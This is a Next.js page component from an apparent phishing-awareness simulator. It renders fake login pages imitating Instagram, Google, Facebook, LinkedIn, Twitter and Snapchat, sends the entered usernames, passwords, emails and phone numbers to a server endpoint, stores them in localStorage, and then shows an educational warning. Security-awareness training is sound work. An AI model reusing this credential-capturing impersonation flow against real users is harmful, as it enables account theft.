'use client'

import { useEffect, useState } from 'react'
import { useParams, useRouter } from 'next/navigation'
import { InstagramPage } from '@/components/phishing/InstagramPage'
import { GooglePage } from '@/components/phishing/GooglePage'
import { FacebookPage } from '@/components/phishing/FacebookPage'
import { LinkedInPage } from '@/components/phishing/LinkedInPage'
import { TwitterPage } from '@/components/phishing/TwitterPage'
import { SnapchatPage } from '@/components/phishing/SnapchatPage'
import { GenericPage } from '@/components/phishing/GenericPage'
import { EducationalWarning } from '@/components/phishing/EducationalWarning'
import { usePreferences } from '@/context/preferences-context'
import { trackLocalInteraction } from '@/components/dashboard/LocalInteractionStats'
import { getLocalStats, updateLocalStats } from '@/lib/local-stats'

export default function PhishingPage() {
  const params = useParams()
  const router = useRouter()
  const slug = params.slug as string
  const [link, setLink] = useState<any>(null)
  const [loading, setLoading] = useState(true)
  const [submitted, setSubmitted] = useState(false)
  const [submissionData, setSubmissionData] = useState<any>(null)
  const { locale } = usePreferences()

  const text = {
    en: {
      loading: 'Loading...',
      missing: 'Link not found',
    },
    ar: {
      loading: 'جاري التحميل...',
      missing: 'الرابط غير موجود',
    },
  }[locale]

  useEffect(() => {
    loadLink()
    // Track phishing page visit
    trackLocalInteraction('PHISHING_VISIT')
  }, [slug])

  const loadLink = async () => {
    try {
      const res = await fetch(`/api/phishing/slug/${slug}`)
      if (res.ok) {
        const data = await res.json()
        setLink(data.link)
      }
    } catch (error) {
      console.error('Failed to load link:', error)
    } finally {
      setLoading(false)
    }
  }

  const handleSubmit = async (data: { username?: string; password?: string; email?: string; phone?: string }) => {
    if (!link) return

    try {
      const res = await fetch('/api/phishing/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phishing_link_id: link.id,
          ...data,
        }),
      })

      if (res.ok) {
        setSubmitted(true)
        setSubmissionData(data)
        
        // حفظ البيانات في localStorage للعبة الواتساب
        if (typeof window !== 'undefined') {
          localStorage.setItem('phishingSubmission', JSON.stringify(data))
          
          // تحديث إحصائيات التصيد المحلية
          const current = getLocalStats()
          updateLocalStats({
            phishingSubmissions: (current.phishingSubmissions || 0) + 1,
            phishingLinks: current.phishingLinks || 0,
          })
          
          // إرسال custom event أيضاً للتوافق
          const event = new CustomEvent('phishingDataSubmitted', {
            detail: data
          })
          window.dispatchEvent(event)
        }
      }
    } catch (error) {
      console.error('Failed to submit data:', error)
    }
  }

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <div className="text-center">
          <div className="text-lg text-muted">{text.loading}</div>
        </div>
      </div>
    )
  }

  if (!link) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <div className="text-center">
          <div className="text-lg text-muted">{text.missing}</div>
        </div>
      </div>
    )
  }

  if (submitted) {
    return <EducationalWarning submissionData={submissionData} link={link} />
  }

  switch (link.template_type) {
    case 'instagram':
      return <InstagramPage onSubmit={handleSubmit} />
    case 'google':
      return <GooglePage onSubmit={handleSubmit} />
    case 'facebook':
      return <FacebookPage onSubmit={handleSubmit} />
    case 'linkedin':
      return <LinkedInPage onSubmit={handleSubmit} />
    case 'twitter':
      return <TwitterPage onSubmit={handleSubmit} />
    case 'snapchat':
      return <SnapchatPage onSubmit={handleSubmit} />
    default:
      return <GenericPage onSubmit={handleSubmit} />
  }
}
